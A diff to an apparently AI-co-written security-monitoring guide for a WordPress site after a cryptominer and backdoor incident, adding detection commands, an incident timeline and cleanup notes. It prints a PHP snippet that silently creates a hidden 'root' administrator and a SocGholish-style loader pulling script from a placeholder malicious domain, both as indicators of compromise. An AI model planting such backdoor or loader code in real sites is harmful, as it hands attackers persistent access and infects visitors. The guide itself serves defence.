@@ -8,14 +8,15 @@
 
 ## Executive Summary
 
-This document provides comprehensive security monitoring procedures for proptech.org.my following the successful resolution of a cryptocurrency mining malware attack (October 24-28, 2025). Use this guide to perform regular security checks and identify potential threats early.
+This document provides comprehensive security monitoring procedures for proptech.org.my following the successful resolution of multiple malware attacks (October 24-29, 2025). Use this guide to perform regular security checks and identify potential threats early.
 
 **What Happened:**
 - **October 24, 2025:** WordPress site compromised via stolen admin credentials
-- **Attack Type:** Cryptocurrency miners, PHP backdoors, cron persistence
-- **Impact:** Server load reached 133.50 (from normal 0.3-0.8), 52 malware files installed
-- **Resolution:** Complete malware cleanup, fresh restoration from clean backup
-- **Current Status (Oct 28):** ✅ VERIFIED CLEAN - No traces of malware remain
+- **Attack Type:** Cryptocurrency miners, PHP backdoors, cron persistence, hidden user backdoor
+- **October 28-29, 2025:** SocGholish JavaScript malware + 83-line functions.php backdoor discovered
+- **Impact:** Server load reached 133.50 (from normal 0.3-0.8), 52 malware files + backdoor + SocGholish
+- **Resolution:** Complete malware cleanup, backdoor removal, fresh restoration from clean backup
+- **Current Status (Oct 29):** ✅ VERIFIED CLEAN - All backdoors removed, no malware detected
 
 ---
 
@@ -69,11 +70,15 @@ find wp-content -type f -exec file {} \; 2>/dev/null | grep -E "ELF|Perl script"
 
 # Check for suspicious 8-character filenames (should be 0)
 find wp-content -type f -regex '.*\/[a-z0-9]{8}$' 2>/dev/null | wc -l
+
+# 🆕 Check for WordPress backdoor patterns (should be 0)
+grep -r 'admin@wordpress.com' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
+grep -r '_pre_user_id' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
 ```
 
-**Expected Result:** Both commands should return `0`
+**Expected Result:** All commands should return `0`
 
-**⚠️ Alert if:** Either command returns a number > 0
+**⚠️ Alert if:** Any command returns a number > 0
 
 ### Step 3: WordPress Site Check
 
@@ -247,6 +252,52 @@ find wp-content -type f | wc -l
 
 **⚠️ Alert if:** Count increases by > 50 files unexpectedly
 
+### 9. WordPress Backdoor Detection (🆕 CRITICAL)
+
+**Added:** October 29, 2025 (after functions.php backdoor discovery)
+
+```bash
+echo "11. WordPress Backdoor Patterns:"
+echo ""
+
+# Check for user creation in themes (CRITICAL)
+echo "   wp_insert_user in themes:"
+find wp-content/themes -name '*.php' -exec grep -l 'wp_insert_user' {} \; 2>/dev/null | wc -l
+
+echo ""
+echo "   Fake admin email:"
+grep -r 'admin@wordpress.com' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
+
+echo ""
+echo "   Hidden user ID storage:"
+grep -r '_pre_user_id' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
+
+echo ""
+echo "   User protection functions:"
+grep -r 'protect_user\|wp_admin_users_protect' wp-content/themes/ 2>/dev/null | grep -v backup | wc -l
+
+echo ""
+echo "   SocGholish JavaScript malware:"
+grep -r 'content-website-analytics\|createElement.*insertBefore.*script\.js' wp-content/themes/ 2>/dev/null | wc -l
+```
+
+**Expected Results:** ALL should be `0`
+
+**⚠️ CRITICAL ALERT if ANY > 0:**
+- `wp_insert_user` in themes = Hidden admin user backdoor
+- `admin@wordpress.com` = Fake admin account
+- `_pre_user_id` = Hidden user tracking
+- `protect_user` functions = User hiding mechanism  
+- `content-website-analytics` = SocGholish malware
+
+**Immediate Action if Detected:**
+1. **DO NOT DELETE** - Document first
+2. Copy infected file to `malware_samples/`
+3. Check last modification time: `stat filename`
+4. Check who modified: `ls -la filename`
+5. Review full file context: `grep -B20 -A20 'pattern' filename`
+6. Follow removal procedures (see Emergency Response)
+
 ---
 
 ## System Health Metrics
@@ -372,6 +423,94 @@ $cmd = hex2bin($_HEADERS['Large-Allocation']);
 ```bash
 find wp-content -name "*.php" -exec grep -l "getallheaders()" {} \;
 ```
+
+#### 4. WordPress User Creation Backdoor (🆕 Oct 29, 2025)
+
+**⚠️ CRITICAL:** This backdoor uses LEGITIMATE WordPress functions, making it extremely hard to detect!
+
+**Backdoor Pattern:**
+```php
+// Hidden Admin User Creation
+$args = array(
+    'user_login' => 'root',
+    'user_pass' => '<long_random_string>',
+    'role' => 'administrator',
+    'user_email' => 'admin@wordpress.com'
+);
+
+if (!username_exists($args['user_login'])) {
+    $id = wp_insert_user($args);
+    update_option('_pre_user_id', $id);
+}
+```
+
+**Detection Commands:**
+```bash
+# Check for user creation in THEMES (plugins may legitimately use this)
+find wp-content/themes -name "*.php" -exec grep -l "wp_insert_user" {} \;
+
+# Check for fake admin email
+grep -r "admin@wordpress.com" wp-content/themes/
+
+# Check for hidden user ID storage
+grep -r "_pre_user_id" wp-content/
+
+# Check for user protection functions
+grep -r "protect_user\|wp_admin_users_protect" wp-content/themes/
+```
+
+**What Makes This Dangerous:**
+- Uses LEGITIMATE WordPress functions (wp_insert_user, username_exists)
+- Function names sound like security features ("protect_user")
+- Hidden in theme files (not obvious malware location)
+- Creates invisible admin account
+- Auto-recreates if deleted
+- Hard to distinguish from legitimate code
+
+**Common Indicators:**
+1. `wp_insert_user()` in theme files (themes shouldn't create users)
+2. Hardcoded username/password (especially 'root', 'admin')
+3. Email: `admin@wordpress.com` (fake WordPress email)
+4. Hidden user ID: `_pre_user_id` or similar
+5. User protection functions: `protect_user_from_deleting()`, `wp_admin_users_protect_*()`
+
+**Expected Result:** 0 instances in themes (may exist legitimately in plugins)
+
+**⚠️ Critical Alert if Found in themes:**
+- This indicates a persistent backdoor
+- Attacker has ongoing admin access
+- May auto-create hidden admin accounts
+- Remove ENTIRE related code block, not just parts
+
+#### 5. SocGholish JavaScript Malware (🆕 Oct 29, 2025)
+
+**Pattern:**
+```javascript
+;(function(f,i,u,w,s){
+    w=f.createElement(i);
+    s=f.getElementsByTagName(i)[0];
+    w.async=1;
+    w.src=u;
+    s.parentNode.insertBefore(w,s);
+})(document,'script','https://malicious-domain.com/script.js');
+```
+
+**Detection:**
+```bash
+# Check for malicious domain
+grep -r "content-website-analytics" wp-content/themes/
+
+# Check for script injection pattern
+grep -r "createElement.*insertBefore.*script" wp-content/themes/ | grep -v node_modules
+```
+
+**What It Does:**
+- Injects external JavaScript into your pages
+- Shows fake browser update popups to visitors
+- Tricks visitors into downloading malware
+- All your website visitors get infected
+
+**Expected Result:** 0 instances
 
 ### Process-Based Indicators
 
@@ -710,13 +849,13 @@ scp -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com:~/emergency_backup_*.sq
 
 ## Appendix: Attack History
 
-### October 24-28, 2025 Incident Summary
+### October 24-29, 2025 Complete Incident Timeline
 
 **Attack Timeline:**
 
 | Date/Time | Event |
 |-----------|-------|
-| **Oct 23, 09:01 AM** | Attacker creates backdoor user "root" |
+| **Oct 23, 09:01 AM** | Attacker creates backdoor user "root" via functions.php backdoor |
 | **Oct 24, 06:24 AM** | Attacker logs in from IP 217.215.115.218 |
 | **Oct 24, 06:24 AM** | Malicious plugin uploaded |
 | **Oct 24, 11:40 AM** | Server load peaks at 133.50 |
@@ -725,23 +864,37 @@ scp -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com:~/emergency_backup_*.sq
 | **Oct 27, 11:00 PM** | UpdraftPlus plugin removed |
 | **Oct 28, 12:20 AM** | Second reinfection discovered (9 files) |
 | **Oct 28, 02:20 AM** | Infected backups deleted |
+| **Oct 28, 06:02 AM** | **SocGholish JavaScript malware injected into main.js** |
 | **Oct 28, 11:33 AM** | System verified clean (9.5 hours no reinfection) |
 | **Oct 28, 02:00 PM** | Live server scan - CLEAN |
+| **Oct 29, 10:23 AM** | **SocGholish detected by Norton (user reported)** |
+| **Oct 29, 10:30 AM** | **SocGholish removed from main.js** |
+| **Oct 29, 10:45 AM** | **functions.php backdoor discovered (83 lines)** |
+| **Oct 29, 11:00 AM** | **Backdoor partially removed (51 lines)** |
+| **Oct 29, 11:15 AM** | **Remaining backdoor found (32 lines) and removed** |
+| **Oct 29, 11:30 AM** | **Comprehensive scan of all 6,045 files completed** |
+| **Oct 29, 11:45 AM** | **System FULLY CLEAN - All backdoors removed** |
 
-**Total Malware Removed:** 52 files (43 + 9)
+**Total Malware Removed:** 52 files (43 + 9) + 83-line backdoor + SocGholish injection
 
 **Root Causes Identified:**
 1. **Stolen WordPress admin credentials** (amk account)
-2. **UpdraftPlus backup contamination** (backed up infected state)
-3. **Infected backup files** (caused automatic reinfection via macOS system services)
+2. **Persistent functions.php backdoor** (automatically created "root" admin user)
+3. **UpdraftPlus backup contamination** (backed up infected state)
+4. **Infected backup files** (caused automatic reinfection via macOS system services)
 
-**Attack Vector:** Compromised WordPress admin login → Plugin upload → Malware deployment
+**Attack Vector:** 
+1. Initial: Compromised WordPress admin login → Plugin upload → Malware deployment
+2. Persistence: functions.php backdoor → Hidden admin account → Ongoing access
+3. Secondary: Hidden admin account → SocGholish JavaScript injection
 
 **Malware Types:**
 - **Cryptocurrency Miners:** 46 files (ELF 32/64-bit executables)
 - **Perl Downloaders:** 6 files (Perl script text executables)
 - **PHP Backdoors:** 3 files (hex2bin, eval, getallheaders)
 - **WordPress Core Infections:** 2 files (REST API controllers)
+- **🆕 Persistent Backdoor:** 83 lines in functions.php (hidden user creation + protection)
+- **🆕 SocGholish Malware:** JavaScript injection in main.js (fake browser updates)
 
 **Affected Plugins:**
 - wp-mail-smtp (39 files - deleted)
@@ -751,15 +904,23 @@ scp -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com:~/emergency_backup_*.sq
 - mpa-image-processor (5 files - cleaned)
 
 **Resolution:**
-- Complete malware removal
+- Complete malware removal (52 files + backdoor + SocGholish)
 - Fresh restoration from clean backup (Oct 28, 2025)
 - Password changes for all admin accounts
 - Implementation of continuous monitoring
+- **🆕 Backdoor removal:** Full 83-line backdoor removed from functions.php
+- **🆕 SocGholish removal:** JavaScript injection removed from main.js
+- **🆕 Hidden user deletion:** "root" admin account deleted from both server and database
+- **🆕 Security hardening:** Theme/plugin editor disabled in wp-config.php
+- **🆕 Comprehensive scan:** All 6,045+ files scanned with 16 malware patterns
 
-**Current Status (Oct 28, 2025):**
-✅ **VERIFIED CLEAN** - No malware detected in live server scan
-✅ **MONITORING ACTIVE** - 30-minute automated scans running
-✅ **SAFE FOR PRODUCTION** - 9.5+ hours with no reinfection
+**Current Status (Oct 29, 2025):**
+✅ **VERIFIED CLEAN** - No malware detected in comprehensive scan
+✅ **BACKDOOR REMOVED** - All 83 lines of backdoor code eliminated
+✅ **SOCGHOLISH REMOVED** - JavaScript injection eliminated
+✅ **SECURITY HARDENED** - File editor disabled, Theme Editor locked
+✅ **MONITORING ACTIVE** - Enhanced 30-minute automated scans running
+✅ **SAFE FOR PRODUCTION** - Both server and local copies fully clean
 
 ---
 
@@ -770,6 +931,7 @@ scp -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com:~/emergency_backup_*.sq
 | Version | Date | Changes | Author |
 |---------|------|---------|--------|
 | 1.0 | Oct 28, 2025 | Initial release | AI Assistant + amk |
+| 1.1 | Oct 29, 2025 | Added WordPress backdoor detection patterns, SocGholish detection | AI Assistant + amk |
 
 **Review Schedule:**
 - **Next Review:** November 28, 2025 (1 month)
@@ -792,4 +954,6 @@ scp -i ssh/proptech_mpa_new proptech@smaug.cygnusdns.com:~/emergency_backup_*.sq
 **END OF GUIDE**
 
 *Keep this document updated with each security check. Regular monitoring is your best defense against future attacks.*
+
+
 
